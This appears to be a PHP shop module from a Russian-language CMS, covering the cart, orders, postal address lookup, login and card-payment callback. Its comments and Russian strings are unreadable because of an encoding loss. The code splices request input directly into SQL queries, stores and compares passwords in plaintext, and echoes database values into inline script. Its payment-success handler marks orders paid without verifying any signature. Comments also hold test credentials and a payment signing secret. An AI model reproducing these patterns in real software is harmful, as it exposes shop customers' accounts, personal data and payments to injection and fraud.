<?php

#
# shop - ���������������� �����
#


class main_shop extends AbstractClass {

	var $catalog; // ������ �������
	var $calculate;

	# ������� ������� ���������� �� ��������� ������(����������� ��� �� ��������)
	function shopClass(        $sub_alias /*������������� �������� ����������� � ������*/        )
	{


		$this->AbstractClass(
		$sub_alias,         // ���� ����������� � ������
                                       'shop',        // �������� ������� � ������� ����� ��������
                                       'shop'           // �������� ������ (�� ��� ������ ���������� � ������� modules)
		);
		 
		global $body, $template;

		$this->setGlobalVars();


        if ($this->current_url_array[0] == $this->module_name)
		{
			$template = 'shop';

			switch ($this->current_url_array[1])
			{				
				case 'put' : $this->output = $this->shopPut(); break;	// ������ ����� � �������
				case 'calc' : $this->shopCalc(); header("Location: /shop/cart/"); exit;
				case 'cart' : $this->output = $this->shopCart(); break;	// ������������ �������
				case 'order' : $this->output = $this->shopOrder(); break; // ������ ����� ����� ������
				case 'del' : $this->shopDelete(); break;	// ������� ����� �� �������
				case 'orderdel' : $this->orderDelete(); break;	// ������� �����
				case 'orderdo' : $this->output = $this->shopOrderDo(); break;
				case 'confirm' : $this->output = $this->confirm(); break;	// ������������� ������
				case 'setuser' : $this->output = $this->setUserForm(); break;
					
				case 'rayon' : $this->output = $this->getRayon(); break;
				case 'gorod' : $this->output = $this->getGorod(); break;
				case 'myindex' : $this->output = $this->getMyIndex(); break;
					
				case 'ordersinfo' : $this->output = $this->getOrdersInfo($this->std->member['user_id']); break; // ���� � �������
				case 'cancelitem' : $this->output = $this->cancelItem();header("Location: /shop/ordersinfo/"); exit;
				case 'login'	: $this->output = $this->getPageAfterCartAuth(); break;
				
                case 'card_payment': $this->output = $this->startAcquiring(); break;
                case 'save_creds': $this->output = $this->saveCredentials(); break;
                case 'extauth': $this->output = $this->extauth(); break;
				default : header("location: /shop/cart/"); exit;
			}

			if ($this->current_url_array[2] == 'ajax')
			{
				// ���� ��������� ���� ����� ajax, �� ����� ���������� ��������� � �������
                if ($this->current_url_array[1] == 'card_payment') {
                    echo $this->startAcquiring();
                }
                else {
				    echo $this->output;
                }
				exit;

			}

			$body = $this->output;
		}

	}


	/**
	 * ���������� ������ � ������� ����� ����� �������� ����������
	 *
	 * @return unknown
	 */
	function shopFastPut()
	{
		$res = '';
		 
		$good_code		= trim($this->std->input['good_code']);
		$good_count		= $this->std->StringToInt($this->std->input['good_count']);

		# �������� ��� �������� � ������, ���� ����� ������ ����������
		$sql = "SELECT * FROM se_catalog WHERE is_sheet = 1 AND id = '$good_code'";
		if ($this->std->db->query($sql, $rows) > 0)
		{
			if ($good_count > 0)
			{
				# ������ �� ������ ������ ������
				$shop = $this->std->getValueSession('module_shop');
				 
				# ������ �� ������ ������ � ������� � �������
				$cart = $shop['cart'];
				 
				if (!is_array($cart)) $cart = array(); // ������� �����
				 
				if (isset($cart['goods'][$good_code]))
				{
					# ����� ����� ��� ���� � �������, ���������� ����������
					$cart['goods'][$good_code]['count'] += $good_count;
				} else {
					# ��������� � ������� ����� �����
					 
					$cart['goods'][$good_code] = array('count' => $good_count, "price" => $rows[0]['price'], "title" => $rows[0]['title'], "catalog_id" => $rows[0]['catalog_id']);
				}
				 

				# ��������� ������� � ������
				$shop['cart'] = $cart;
				$this->std->updateSession($this->std->member['session_id'], 'update', array('module_shop' => $shop));
			}
			else
			{
				$res = '������� ����������';
			}
		}
		else
		{
			$res = '����� �� ������';
		}

		global $shop_fastput_error;
		$shop_fastput_error = '<br><h3>'.$res.'</h3>';
	}


	function shopCalc()
	{
		# �������� ������ ������� (������������ ��� �������� ���������� �������)
		$shop = $this->std->getValueSession('module_shop');

		foreach ($this->std->input['count'] as $gid => $count)
		{
			$count = preg_replace( "/[^0-9\.]/"  , ""  , $count );
			$count = $count == '' ? 0 : $count;

			if ($count != 0)
			{
				$shop['cart']['goods'][$gid]['count'] = $count;
			}
			else
			{
				# ���� ���������� 0, �� ������� ����� �� ������
				unset($shop['cart']['goods'][$gid]);
			}
		}



		# �������� ����������, ������  �������� �������������
		if (is_array($this->std->input['predoplata_sum']))
		foreach ($this->std->input['predoplata_sum'] as $cid => $value)
		{
			 
			 
			# ������ ������ (���.�������/���������� ������)
			if (isset($this->std->input['type_pay_'.$cid]))
			{

				$shop['cart']["type_pay_".$cid] = $this->std->input['type_pay_'.$cid];

				if ($this->std->input['type_pay_'.$cid] == 'post_perevod')
				{
					$value = str_replace(",", ".", $value);
					$value = preg_replace( "/[^0-9\.]/"  , ""  , $value ); // ������� �������� �� ���������� ������
					$value = $value == '' ? 0 : $value;
					$shop['cart']["predoplata_sum"][$cid] = round($value); // ��������� � ������� �������, ��� �� ����� ������� :)
				}
				else
				{
					$shop['cart']["predoplata_sum"][$cid] = 0;
				}
			}
		}

		$this->std->updateSession($this->std->member['session_id'], 'update', array('module_shop' => $shop));
		 
		if (($this->current_url_array[2] == 'ajax') && ($this->current_url_array[1] == 'calc'))
		{
			// ��������� ���� ����� ajax, ����� ������ ��� �����
			echo $this->shopCart();
			exit;
		}
	}
	 

	/**
	 * ������� ����� � ��������
	 *
	 * @param unknown_type $el
	 * @return unknown
	 */
	function strips(&$el) {
		if (is_array($el))
		foreach($el as $k=>$v)
		strips($el[$k]);
		else $el = stripslashes($el);

		return $el;
	}

	function user_isset($data, $do, &$message, &$user)
	{
		global $auth_shopauth_nopass, $auth_shopreg_do, $auth_shopreg_isset_user;
		$user		= array();
		$ok		= true;
		$message	= '';
		 
		 
		$data['index'] = $this->std->clean_value($data['index']);
		 

		$sql = "SELECT * FROM se_users WHERE user_name = '".$data['user_name']."'";
		if ($this->std->db->query($sql, $rows) > 0)
		{
			if ($data['user_pass'] == $rows[0]['user_pass'])
			{
				if ($do == 1)
				{
					# ������ �������, ����������� �� �����
					$message = $auth_shopreg_isset_user;
				}
				else
				{
					# ������ �������, ����� ��������� �����
					$message = $auth_shopreg_do;
				}
				$data['user_email'] = $data['email'];
				$user = $data;
			}
			else
			{
				# ������������ ���� � ����, �� ������ �� �������
				$message = $auth_shopauth_nopass;
				$data['user_email'] = $data['email'];
				$user = $data;
			}
		}
		else
		{
			# ������ ������������ ��� ���, ������ ����� �������
			 
			$pms = array(
        				'user_name' => $data['user_name'],
	        			'user_pass' => $data['user_pass'],
	        			'user_email' => $data['email'],
	        			'user_access' => '2', // ������������
	        			'user_cache' => serialize($data),
	        			'user_is_active' => 1,
        				'user_rectime ' => time()
			);
			if ($data['user_parent']) $pms['user_parent'] = $data['user_parent'];
			$this->std->db->do_insert('users', $pms);
			$data['user_id'] = $this->std->db->get_insert_id();
			$data['user_email'] = $data['email'];
			// ����� ��������� � ����������� � ������
			$user = $data;
		}

		return $ok;
	}

    //login:test1344517400
    //passw:dD8IWz
    // ������ ������ ������ - ����������� � ����������� �������.
    function startAcquiring() 
    {
    	if ($this->current_url_array[3] == 'success')
    	{
    		//print_r($this->std->input);
            /*$order_id = $this->std->input['Order_ID'];
            $sign = $this->std->input['Signature'];
            $status = $this->std->input['Status'];
            foreach ($this->std as $k => $v) {
                $html.= "<p>$k =>> $v</p>";
            }
            $passwd = 'Q9xe5bLS8Kp3TEN2nC47apCr5yxhppQsJGF8F0Jx9CzpEjv5gIyUWZICJDouvJpIAdAb4TV1YmqQ1Gom';
            $signature = strtoupper(md5($order_id . $status . $passwd));            */
            $html = "<p>������ ��������� �������</p>";
            $html.= "<a href=\"/shop/ordersinfo/\">��������� � ������ �������</a>";    		
            $sql = "UPDATE se_orders SET status=1, order_approved=1 WHERE order_id='$order_id'";
			$this->std->db->do_query($sql);
            //$this->std->db->do_query("INSERT INTO se_uniteller(order_id,order_status,signature) VALUES ('$order_id',$status,'$sign')");
            //}
            //else {
            //    $html = '<p>������ ��������� ������� - ���������� �����������!</p>';
            //    $html.= "<a href=\"/shop/ordersinfo/\">��������� � ������ �������</a>";
            //}       
            echo $html;
    	}
    	else
    	{
    		$html = "<p>� �������� ������ �������� ������ - ������ ��������</p>";
            $html.= "<a href=\"/shop/ordersinfo/\">��������� � ������ �������</a>";    		
    		echo $html;
    	}    	
    	exit;
    }


    //���������� ������, ��������� ����� ����� ���������� �������� �������
    function saveCredentials() {
    	$user_id = $this->std->member['user_id'];
    	$postind = $this->std->input['post_index'];
    	$oblast = $this->std->input['oblast'];
    	$raion = $this->std->input['raion'];
    	$town = $this->std->input['town'];
    	$phone = $this->std->input['phone'];
    	$house = $this->std->input['house'];
        $sql = "UPDATE se_users SET PostIndex='$postind', Oblast='$oblast', Rayon='$raion', Town='$town', ShippingAddress='$house', phone='$phone' where user_id=$user_id";
		$this->std->db->do_query($sql);
		return "<p>������ ������� ���������</p><br /><a href=\"/shop/ordersinfo/\">���������</a>";
    }

    function extauth() {
    	$html= '
		<div id="authWrapper" style="width: 100%; margin-top: 20px;">
			</form>
			<form name="extauth_form" method="POST" action="/shop/extauth/login/">
				<div id="auth" style="margin: 0 auto; width: 300px;">
					<p>����������, �������� ����������</p>
					<input class="form_field" type="text" id="login" name="login" placeholder="�����" style="width: 300px; display:block;margin-bottom: 15px;">
					<input class="form_field" type="password" id="pass" name="pass" value="" placeholder="������" style="width: 300px; display: block;margin-bottom: 15px;">
					<input type="submit" value="�����" id="sbmt">
				</div>
		</div>';
		if (isset($this->current_url_array[2])) {
			$addParam = $this->current_url_array[2];
			switch ($addParam) {
				case 'login':
					$in_login = $this->std->input['login'];
					$in_pass = $this->std->input['pass'];
					$sql = "SELECT user_id,user_pass,user_email,user_name,user_access,user_cache,module_access,KodRec,ClientName
                            FROM `se_users` 
                            WHERE user_name='$in_login'
                            LIMIT 0,1";
                    //$out = '<p>'.$sql.'</p>';
                	if ($this->std->db->query($sql, $rows) > 0)
                	{
                		//$out.= '<p>Login...user found</p>';
                		if ($in_pass==$rows[0]['user_pass']) {	
	                		// ���������� � ���� ID ������������ � ������ � MD5
			                $this->std->my_setcookie('member_id', $rows[0]['user_id']);
			                $this->std->my_setcookie('auth', 'ok');
			                // ��������� � ������� ������ ID ������������
			                $this->std->db->do_update('session', array('session_member_id' => $rows[0]['user_id']), "session_id='{$this->std->session_id}'");
			                // ���������� ������� ������ � ������ ������������
			                $this->std->member = array_merge($this->std->member, $rows[0]);
			                //return $this->getOrdersInfo($rows[0]['user_id']);
			                return '<script type="text/javascript">window.location.href="http://test.best-mos.ru/shop/ordersinfo/"</script>';
						}
					else {
						$out.= "<p>������: �������� ����� ��� ������. ���������� <a href=\"/shop/extauth/$in_login\">�����</a></p>";
					}
                	}	
                	else {
                		$out.= '<p>Authorization error: user was not found</p>';
                	} 
                	return $out;
					break;
				default:
					//$req_url = $addParam;					
					$sql = "SELECT KodRec FROM se_orders WHERE order_url LIKE '%$addParam'";
					if ($this->std->db->query($sql, $rows) > 0)
					{
						$login = strtolower($rows[0]['KodRec']);
						$html.="<script type\"text/javascript\">$('#login').attr('value','$login');</script>";
					}
					//$html.="<script type\"text/javascript\">$('#login').attr('value','$sql');</script>";
					return $html;
				break;
			}
		}
		return '';
    }

	/**
	 * ���������� ������ � ��� ������������� - ����������� ������������
	 *
	 */
	function shopOrderDo()
	{

		if ($this->std->input['from_last_order_form'] == 'yes')
		{
			// ���� ����������: ������� ������������� ����� �� �������� /shop/login/  � ������� ��� ������ �� �����
			error_log(strftime("%d.%m.%Y %H:%M:%S")." ������������ � ID[".$this->std->member['user_id']."] ����� � ������� ������. ���� ������������ ������� �� �������� �����������/�����������.\n", 3, LOG_PATH."/order.log");
		}
		else
		{
			error_log(strftime("%d.%m.%Y %H:%M:%S")." ������������ � ID[".$this->std->member['user_id']."] ����� � ������� ������. ���� ������������ ������� �� �������, ������ ��������������.\n", 3, LOG_PATH."/order.log");
		}

		$ok	= '';
		$res	= '';
		$dataform = array();

		 
		# � ����� ����� ������� ������ �� �������, ��������� ��������� ��������������� �� �������
		if ($this->std->input['request_method'] != 'post')
		{
			unset($this->current_url_array[2]);
			$this->current_url_array[1] = 'cart';
			return $this->shopCart();
		}

		# ������������ ������ ���� ����������� �����������!!!
		if (!isset($this->std->member['user_id']))
		{
			header('Location: /');
		}

		if ($this->std->input['first_buy'] == 'no')
		{
			# ������������ �����������, �������� ������ �������� ����� � ��������� ��� ������ ��� �������������			
			if (is_array($this->std->member['user_cache']))
			{
				$dataform = array_merge($dataform, $this->std->member);
				$dataform = array_merge($dataform, $this->std->member['user_cache']);
				$user = $dataform;
			}			
		}

		$tmp = iconv('UTF-8', 'CP1251', $_POST['comment']);
		$this->strips($tmp);
		$tmp = str_replace('"', "'", $tmp);
		$dataform['comment'] = $this->std->clean_value($tmp);

		# ���� ��� �������� ������ ������������ ������ ��� ���������������, �� ��������� ����� � ���������� �������������� ������
		if (!is_array($user))
		{
			$dataform = array();
			 
			$dataform['index'] = substr($this->std->input['gorod'], 0, strpos($this->std->input['gorod'], ','));
			$dataform['adress_deliver'] = iconv('UTF-8', 'CP1251', $this->std->input['adress_deliver']);
			$dataform['adress'] = iconv('UTF-8', 'CP1251', $this->std->input['gorod']);

			$dataform['f'] = iconv('UTF-8', 'CP1251', $this->std->input['f']);
			$dataform['i'] = iconv('UTF-8', 'CP1251', $this->std->input['i']);
			$dataform['o'] = iconv('UTF-8', 'CP1251', $this->std->input['o']);
			$dataform['email'] = iconv('UTF-8', 'CP1251', $this->std->input['email']);
			$dataform['phone'] = iconv('UTF-8', 'CP1251', $this->std->input['phone']);
			$dataform['user_pass'] = $this->std->input['passwd'];
			$dataform['user_name'] = iconv('UTF-8', 'CP1251', $this->std->input['user_name']);
			$dataform['user_parent'] = $this->std->member['user_id'];

			$this->user_isset($dataform, 0, &$body, &$user);
		}
		if (is_array($user))
		{
			# �������� ������
			require_once( INCLUDE_PATH."/lib/class_mailer.php");
			$mailer = new ClassMailer();
			$mailer->is_html = 1;
			 
			global $_shop_cart_formail, $_shop_mail_message, $zakaz_status;
			global $_shop_oplata_bank, $_shop_olpata_pochta, $_shop_oplata_html;
			$plat = array();
			$replace = array();
			$replace['{ORDER}'] = $this->shopCart($_shop_cart_formail); // ���� ������ � ����������� � ������;
			 
			 
			 
			 
			 
			# ���� �� ���������
			$time = time();
			if (is_array($this->calculate->goods))
			foreach ($this->calculate->goods as $cid => $goods)
			{
				#----------------------------------------------
				# ������������ ������
				#----------------------------------------------
				$pms = array();
				$pms['order_time'] 		= $time;	// ����� ������
				$pms['user_id'] 		= $user['user_id'];	// ������������� ������������
				$pms['predoplata_sum'] 	= $this->calculate->predoplata[$cid];	// ����� ������������������ ����������
				$pms['total'] 			= $this->calculate->total[$cid];	// ����� ������
				$pms['comment'] 		= $dataform['comment'];	// �����������
				$pms['author_id']		= $this->std->member['user_id'];
				$pms['status']			= 1;
				$this->std->db->do_insert('orders', $pms);
				$order_id 				= $this->std->db->get_insert_id();



				# ���� �� �����-�� �������� �� ���������� �������� ������, �� �����
				if ($order_id == '')
				{
					return '� ��������� ����� �� ������, ����������� ������.<br>���������� �����.';
				}


				if ($this->calculate->predoplata[$cid] != 0)
				{
					# ���� ����� ���������� �� ����� 0, ������ ������ ����� ������� � ����� ���� � ���������� ��������
					$plat[$cid]['pochta'] = $_shop_olpata_pochta;
					$plat[$cid]['bank'] = $_shop_oplata_bank;
				}

				# ���� �� ������� � ��������, ������������ ������� � ������� �������� ������� ������
				foreach ($goods as $lot => $good)
				{						
					# ������ ������ � ����
					$sql = "SELECT * FROM se_catalog WHERE id='{$lot}'";
					if ($this->std->db->query($sql, $rows) > 0)
					{
						$pms = array();
						$pms['id_order']		= $order_id;
						$pms['catalog_id']		= $rows[0]['catalog_id'];
						$pms['lot_id']			= $lot;
						$pms['lot_count'] 		= $good['count'];
						$pms['kat_price'] 		= $rows[0]['price'];
						$pms['title'] 			= $rows[0]['title'];
						$pms['zakaz_status'] 	= $zakaz_status[0];

						$this->std->db->do_insert('orders_item', $pms);
					}
					else
					{
						# ���� �����, �� ������ ������ �������
						$pms = array();
						$pms['id_order']		= $order_id;
						$pms['catalog_id']		= $cid;
						$pms['lot_id']			= $lot;
						$pms['lot_count'] 		= $good['count'];
						$pms['kat_price'] 		= $good['price'];
						$pms['title'] 			= $good['title'];
						$pms['zakaz_status'] 	= $zakaz_status[0];

						$this->std->db->do_insert('orders_item', $pms);
					}
						
				}
			}		
				
				
			#----------------------------------------------
			# ���������� ������ ��� �������� ������������
			#----------------------------------------------
			 
			$replace['{i}'] = $user['i'];
			$replace['{f}'] = $user['f'];
			$replace['{o}'] = $user['o'];
			$replace['{adress}'] = $user['adress'].', '.$user['adress_deliver'];
			$replace['{user_email}'] = $user['user_email'];
			$replace['{user_pass}'] = $user['user_pass'];
			$replace['{index}'] = $user['index'];
			$replace['{ALIAS}'] = 'http://'.$this->std->host.'/shop/confirm/'.$order_id.'/';

			$mail_message = strtr($_shop_mail_message, $replace); // ��������� ��� ��������
			 
			 
			 
			 
			#----------------------------------------------
			# ���������� ������ ��� �������� ������������
			#----------------------------------------------
			 
			require_once( INCLUDE_PATH."/lib/class_digitwords.php");
			$DigitsWords = new CDigitWords;
				
			$blanks = array();
			$company = array(
        							"{company}" => $this->std->settings['company'],
				        			"{kpp}" => $this->std->settings['company_kpp'],
				        			"{inn}" => $this->std->settings['�ompany_inn'],
				        			"{okato}" => $this->std->settings['company_okato'],
				        			"{rschot}" => $this->std->settings['company_rschot'],
				        			"{bank}" => $this->std->settings['company_bank'],
				        			"{bik}" => $this->std->settings['company_bik'],
				        			"{kschot}" => $this->std->settings['company_kschot'],
				        			"{kbk}" => $this->std->settings['company_kbk'],
				        			"{company_adress}" => $this->std->settings['company_adress']
			);
				
			 
			# �� ���������
			foreach ($plat as $cid => $mail_template)
			{
				if (count($mail_template) > 0)
				{
					# ���� ���������� �������� ������ 1, ������ ���� ����������, ������ ����� ����������� ��������
						
					$sql = "SELECT title FROM se_catalog WHERE id = '$cid'";
					if ($this->std->db->query($sql, $rows) > 0)
					{
						$catalog_title = $rows[0]['title'];
						# �� ����� ��������
						foreach ($mail_template as $type_opata => $blank)
						{
							# ���� ����� ����������, �� ����� ��������� ��� ��������
								
							$blank = strtr($blank, $replace);
							$blank = strtr($blank, $company);
							$blank = str_replace('{host}', $this->std->host, $blank); // ��������� ��������
							$blank = str_replace('{catalog_title}', $catalog_title, $blank); // ��������� ��������

							$type_opata_title = '';
							$type_opata_title = ($type_opata == 'bank') ? '���������� �������' : '�������� �������';

							$blank = str_replace('{predoplata}', $this->calculate->predoplata[$cid], $blank);
							$rub = $DigitsWords->getRubles(round($this->calculate->predoplata[$cid]));
							$blank = str_replace('{predoplata_word}', $rub['words'], $blank);

							$blank = str_replace('{blank}', $blank, $_shop_oplata_html);
							$mailer->attach_file_from_stream($blank, $catalog_title.' - '.$type_opata_title.'.rtf', 'rtf');
						}
					}
				}
			}

			//$mail_message = str_replace('{blanks}', implode('<br><br>', $blanks), $mail_message);
			 
			 
			//print_r($user);
			//echo "<br>";
			//echo "TO: ".$user['user_email']."<br>";
			//echo "MSG:".$mail_message."<br>";
			 
			$mailer->from = $this->std->settings['site_email'];
			$mailer->subject = $this->std->settings['site_title'];
			$mailer->to = $user['user_email'];
			$mailer->message = $mail_message;
			$mailer->send_mail();

			unset($mailer);
				
				
				
			 
			# ��������� ������ ������������ ���� � ������ �������
			$this->updateAttend();
				
				
			 
			# ������� �������
			$shop['cart']['goods'] = array();
			$this->std->updateSession($this->std->member['session_id'], 'update', array('module_shop' => $shop));
			 
			 
			global $_shop_OrderDo_done;
			$message = $_shop_OrderDo_done;
		}

		// ���� ����������: ������� ������������� ����� �� �������� /shop/login/  � ������� ��� ������ �� �����
		error_log(strftime("%d.%m.%Y %H:%M:%S")." ������������ � ID[".$this->std->member['user_id']."] ����� �� ������� ������.\n\n", 3, LOG_PATH."/order.log");

		return $message;
	}
	 

	function setUserForm() {
		global $_shop_order;
		$ret = $_shop_order['setuser'];
		return $ret;
	}

	function cancelItem() {
		global $zakaz_status;
		$itemId = $this->std->StringToInt($this->current_url_array[2]);
		if ($itemId) {
			$sql = "update se_orders_item set zakaz_status='".$zakaz_status[8]."' where id='".$itemId."'";
			$this->std->db->do_query($sql);
		}
	}

	/**
	 * ������� ����� ������
	 *
	 */
	function shopOrder()
	{
		global $_shop_order;
		$ret = $_shop_order['begin'];

		# � ����� ����� ������� ������ ������� �� �����, ��������� ��������� ��������������� �� �������
		$shop = $this->std->getValueSession('module_shop');
		if (isset($$shop['cart']['goods']) && (count($$shop['cart']['goods']) > 0))
		{
			unset($this->current_url_array[2]);
			$this->current_url_array[1] = 'cart';
			return $this->shopCart();
		}


		# ���� ������������ �� �����������, ����� ���������� ��� ����� ��� ����� ������ ��� ���������� ��� �����������
		//if ($this->std->member['session_member_id'] == 0)
		{
			if(isset($this->std->input['first_buy']) && ($this->std->input['first_buy'] == 'yes') )
			{
				# ������������ ������ ��� ����� �� �������� ��� ���������� ������ "��������� �������"
				$ret = str_replace('{yes}', 'checked', $ret);
				$ret = str_replace('{no}', '', $ret);
				$ret .= $_shop_order['body_first_buy'];
				$ret = str_replace('{ADDING_TEXT}', '������� ���� ������', $ret);
				$ret = str_replace('{docs}', '', $ret);	// ������� �������, ������� ����� ��� ������ ������ "������ ���������"

				$ret = str_replace('{regions}', $this->getRegions(), $ret);
			}
			else
			{
				# ������������  ������ "��������� �� �������"
				$ret = str_replace('{yes}', '', $ret);
				$ret = str_replace('{no}', 'checked', $ret);
				$replace = array();
				$replace['{f}'] = $this->std->member['user_cache']['f'];
				$replace['{i}'] = $this->std->member['user_cache']['i'];
				$replace['{o}'] = $this->std->member['user_cache']['o'];
				$ret .= strtr($_shop_order['do_order'], $replace);
			}
		}
		//else
		//{
		//	$replace = array();
			//	$replace['{f}'] = $this->std->member['user_cache']['f'];
		//	$replace['{i}'] = $this->std->member['user_cache']['i'];
		//	$replace['{o}'] = $this->std->member['user_cache']['o'];
		//	$ret = strtr($_shop_order['do_order'], $replace);
		 
		//	return $ret;
		//}


		return $ret;
	}




	/**
	 * ������������ ������ �������� � ���� <option>
	 *
	 */
	function getRegions()
	{
		$ret = '<option></option>';
		 
		$sql = 'SELECT oblast FROM se_post GROUP BY oblast ORDER BY oblast ASC';
		if ($this->std->db->query($sql, $rows) > 0)
		{
			foreach ($rows as $row)
			{
				$ret .= '<option>'.$row['oblast'].'</option>';
			}
		}

		return $ret;
	}



	/**
	 * ������������ ������ �������� � ���� <option>
	 *
	 */
	function getRayon()
	{
		$ret = '';
		$ret .= '<option></option>';

		$region = iconv('UTF-8', 'CP1251', $this->std->input['region']);
		$where = " WHERE oblast = '$region' ";
		$sql = 'SELECT rayon FROM se_post '.$where.' GROUP BY rayon ORDER BY rayon ASC';
		if ($this->std->db->query($sql, $rows) > 0)
		{
			foreach ($rows as $row)
			{
				if (is_null($row['rayon']))
				{
					$ret .= '<option>- ����� �� ���������</option>';
				}
				else
				{
					$ret .= '<option>'.$row['rayon'].'</option>';
				}
			}
		}

		return $ret;
	}


	/**
	 * ������������ ������ �������� ��������� � ���� <option>
	 *
	 */
	function getGorod()
	{
		$ret = '';
		$ret .= '<option></option>';
		 
		$rayon = iconv('UTF-8', 'CP1251', $this->std->input['rayon']);
		$region = iconv('UTF-8', 'CP1251', $this->std->input['region']);
		if ($rayon == '- ����� �� ���������')
		{
			$where = " WHERE oblast = '$region' AND rayon is NULL ";
		}
		else
		{
			$where = " WHERE oblast = '$region' AND rayon = '$rayon' ";
		}
		 
		$sql = 'SELECT postind, gorod FROM se_post '.$where.' GROUP BY gorod ORDER BY gorod ASC';
		if ($this->std->db->query($sql, $rows) > 0)
		{
			foreach ($rows as $row)
			{
				$ret .= '<option value="'.$row['postind'].', '.$region.', '.$rayon.', '.$row['gorod'].'">'.$row['gorod'].' ('.$row['postind'].')</option>';
			}
		}
		 
		return $ret;
	}


	function getMyIndex()
	{
		$ret = '';
		//$ret .= '<option></option>';
		 
		$index = preg_replace( "/[^0-9\.]/"  , ""  , $this->current_url_array[3] );
		$index = $index == '' ? 0 : $index;
		$where = " WHERE postind = '$index' OR IndOld = '$index'";
		 
		 
		$sql = 'SELECT postind, oblast, rayon, gorod FROM se_post '.$where.' LIMIT 1';
		if ($this->std->db->query($sql, $rows) > 0)
		{
			$row = $rows[0];

			$row['oblast'] = iconv('CP1251', 'UTF-8', $row['oblast']);
			$row['rayon'] = iconv('CP1251', 'UTF-8', $row['rayon']);
			$row['gorod'] = iconv('CP1251', 'UTF-8', $row['gorod']);

			if ($row['rayon'] == '')
			{
				$row['rayon'] = iconv('CP1251', 'UTF-8', '- ����� �� ���������');
				$ret .= '<option value="'.$row["postind"].', '.$row['oblast'].', '.$row['gorod'].'">'.$row['gorod'].' ('.$row['postind'].')</option>';
				$adress = $row["postind"].', '.$row['oblast'].', '.$row['gorod'];
			}
			else
			{
				$ret .= '<option value="'.$row["postind"].', '.$row['oblast'].', '.$row['rayon'].', '.$row['gorod'].'">'.$row['gorod'].' ('.$row['postind'].')</option>';
				$adress = $row["postind"].', '.$row['oblast'].', '.$row['rayon'].', '.$row['gorod'];
			}


			$ret = array(
        					'oblast'	=> $row['oblast'],
        					'rayon'		=> "<option>".$row['rayon']."</option>",
        					'gorod'		=> $ret,
        					'adress'	=> $adress,
        					'error'		=> ''
        					);
		}
		else
		{
			$error = iconv('CP1251', 'UTF-8', '��������� ������ �� ������ ����� �������� �������� ������');
			$ret = array('error' => $error);
		}
		 
		 
		$ret = json_encode($ret);
		return $ret;
	}



	/**
	 * ������� �� ������� ������������
	 *
	 */
	function shopDelete()
	{
		$good_id = $this->current_url_array[2];
		if ($good_id > 0)
		{
			$shop = $this->std->getValueSession('module_shop');
			if (isset($shop['cart']['goods'][$good_id]))
			{
				unset($shop['cart']['goods'][$good_id]);
				$this->std->updateSession($this->std->member['session_id'], 'update', array('module_shop' => $shop));
			}
		}

		header("Location: ".$_SERVER['HTTP_REFERER']);
		exit;
	}

	function orderDelete() {
		$order_id = $this->current_url_array[2];
		if ($order_id>0) {
			$sql = "select * from se_orders where order_id='".$order_id."'";
			if ($this->std->db->query($sql, $rows) > 0)
			{
				$order = $rows[0];
			} else return;
			$user = $this->std->member['user_cache'];
			require_once( INCLUDE_PATH."/lib/class_mailer.php");
			$mailer = new ClassMailer();
			$mailer->is_html = 1;
			global $_orderdel_mail_message, $zakaz_status;

			#----------------------------------------------
			# ���������� ������ ��� �������� ������������
			#----------------------------------------------
			 
			$replace['{i}'] = $user['i'];
			$replace['{f}'] = $user['f'];
			$replace['{o}'] = $user['o'];
			$replace['{adress}'] = $user['adress'].', '.$user['adress_deliver'];
			$replace['{user_email}'] = $user['user_email'];
			$replace['{index}'] = $user['index'];
			$replace['{order_date}'] = $this->std->get_time($order['order_time'], 'd.m.Y');

			$mail_message = strtr($_orderdel_mail_message, $replace); // ��������� ��� ��������

			$mailer->from = $this->std->settings['site_email'];
			$mailer->subject = $this->std->settings['site_title'];
			$mailer->to = $user['user_email'];
			$mailer->message = $mail_message;
			$mailer->send_mail();
			unset($mailer);


			$sql = "update se_orders_item set zakaz_status='".$zakaz_status[6]."' where id_order='".$order_id."'";
			$this->std->db->do_query($sql);
			$sql = "update se_orders set status=6, order_approved=-1 where order_id='".$order_id."'";
			$this->std->db->do_query($sql);
		}
		header("Location: ".$_SERVER['HTTP_REFERER']);
		exit;
	}
	 
	/**
	 * ������� ����� �������
	 *
	 * @return unknown
	 */
	function shopCart($template = '')
	{
		if (isset($this->std->member['user_id']))
		{
			// ���� ����������: ������� ������������� ����� �� �������� /shop/login/  � ������� ��� ������ �� �����
			error_log(strftime("%d.%m.%Y %H:%M:%S")." ������������ � ID[".$this->std->member['user_id']."] ����� � �������.\n", 3, LOG_PATH."/order.log");
		}
		 
		$ret = '';
		$disabled = false;
		$predoplata_total = 0;

		global $_shop_cart, $_shop_cart_empty;
		if (is_array($template)) $_shop_cart = $template;

		$shop = $this->std->getValueSession('module_shop');
		 
		if (count($shop['cart']['goods']) == 0)
		{
			# ������� �����
			$ret = $_shop_cart_empty;
		} else {
			 
			# ������� ��������� ���������
			$catalogs = array();
			$sql = "SELECT id, title FROM se_catalog WHERE `pid` = -1";
			$this->std->db->do_query($sql);
			while ($row = $this->std->db->fetch_row())
			{
				$catalogs[$row['id']] = $row['title'];
			}
			 
			 
			 
			# ������� ������ � ������� �� ����
			$ids = array();

			foreach ($shop['cart']['goods'] as $gid => $good)
			{
				$ids[] = $gid;
			}

			$goods = array();
			if (count($ids) == 1)
			{
				$sql = "SELECT * FROM se_catalog WHERE `id` = ".$ids[0];
			}
			if (count($ids) > 1)
			{
				$sql = "SELECT * FROM se_catalog WHERE `id` = ".implode(" OR `id` = ", $ids);
			}

			$this->std->db->do_query($sql);
			while ($row = $this->std->db->fetch_row())
			{
				$goods[$row['id']] = $row;
				//echo "res=".$this->isFreeCatalog($row['id']);
			}



			#----------------------------------------------------------
			# ������� ������ �� ���� ������� �������
			# ����������� ��������� � �������� �����, ��� �������� ����
			#----------------------------------------------------------

			# ���������� ���������� ��� ������� ������ � ���������
			require_once BASE_PATH.'calculate/calculate_main.php';
			$calculate = new class_calculate($shop['cart']);
			$calculate->std = &$this->std;
			$calculate->calculateBasket();
			$this->calculate = &$calculate;

			 


			#----------------------------------------------------------
			# ��������� �������
			#----------------------------------------------------------
			$ret .= str_replace("{SHOP_INFO}", $this->std->settings['shop_info'], $_shop_cart['pre_begin']);
			$ret = str_replace("{SHOP_MAIL_INFO}", $this->std->settings['shop_mail_info'], $ret);


			// print_r($calculate->predoplata);
			foreach ($calculate->goods as $cid => $group)
			{
				$isFree = $this->isFreeCatalog($cid);
				$sql = "select sum(oi.lot_count*oi.kat_price) as sum, sum(o.predoplata_fact) as predoplata from se_orders_item oi inner join se_orders o on o.order_id=oi.id_order where o.user_id='".$this->std->member['user_id']."' and oi.catalog_id='".$cid."' and o.status<>4";//echo $sql;
